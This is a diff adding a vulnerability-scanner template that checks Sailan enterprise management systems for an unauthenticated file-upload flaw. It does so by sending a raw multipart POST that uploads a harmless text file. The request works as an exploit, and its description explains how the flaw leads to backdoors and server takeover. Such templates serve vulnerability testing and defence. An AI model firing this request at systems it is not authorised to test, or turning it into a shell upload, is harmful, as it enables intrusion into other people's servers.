@@ -1,0 +1,31 @@
+id: sailan-SubmitUploadify-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 赛蓝企业管理系统 /EHRModule/EHR_Holidays/SubmitUploadify 接口处存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E8%B5%9B%E8%93%9D%E4%BC%81%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FSubmitUploadify%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /EHRModule/EHR_Holidays/SubmitUploadify?FolderId=1&UserId=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2558.72 Safari/537.36
+        Accept-Ldwk: bG91ZG9uZ3dlbmt1
+        Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805
+        Connection: close
+        Content-Length: 336
+
+        -----------------------------142851345723692939351758052805
+        Content-Disposition: form-data; name="Filedata"; filename="11.txt"
+        Content-Type: image/png
+
+        1234
+        -----------------------------142851345723692939351758052805--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '.txt'
